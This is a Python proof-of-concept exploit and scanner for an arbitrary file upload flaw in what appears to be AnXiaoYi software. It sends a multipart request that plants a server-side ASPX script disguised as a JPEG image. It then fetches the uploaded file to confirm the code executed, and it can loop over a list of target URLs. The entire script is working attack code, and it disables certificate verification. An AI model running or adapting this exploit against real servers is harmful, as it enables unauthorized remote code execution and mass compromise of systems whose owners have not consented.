import requests
import urllib3
import string,random
from urllib.parse import urljoin
import argparse
import time
import ssl
import json
import urllib.request
ssl._create_default_https_context = ssl._create_unverified_context
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def read_file(file_path):
    with open(file_path, 'r') as file:
        urls = file.read().splitlines()
    return urls

def check(url):
    url = url.rstrip("/")
    target = urljoin(url,"/Module/FileUpPage/FileUpProductupdate.aspx")
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36",
        "Content-Type": "multipart/form-data;boundary=----230982304982309"
    }
    data = """------230982304982309\r\nContent-Disposition: form-data; name="Filedata"; filename="test.aspx"\r\nContent-Type: image/jpeg\r\n\r\n<%@Page Language="C#"%><%Response.Write("HelloWorldTest");System.IO.File.Delete(Request.PhysicalPath);%>\r\n------230982304982309--"""
    try:
        response = requests.post(target, verify=False, headers=headers, data=data, timeout=15)
        if response.status_code == 200 and 'saveName' in response.text and 'update.aspx' in response.text:
            result_url = urljoin(url,'/Upload/Publish/000000/0_0_0_0/update.aspx')
            result_response = requests.get(result_url,timeout=15,verify=False,headers = {"User-Agent": "MMozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36",})
            if result_response.status_code == 200 and 'HelloWorldTest' in result_response.text:
                print(f"\033[31mDiscovered:{url}: AnXiaoYi_FileUpProductupdate_ArbitraryFileUpload!\033[0m")
                return True
    except Exception as e:
        pass

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="URL")
    parser.add_argument("-f", "--txt", help="file")
    args = parser.parse_args()
    url = args.url
    txt = args.txt
    if url:
        check(url)
    elif txt:
        urls = read_file(txt)
        for url in urls:
            check(url)
    else:
        print("help")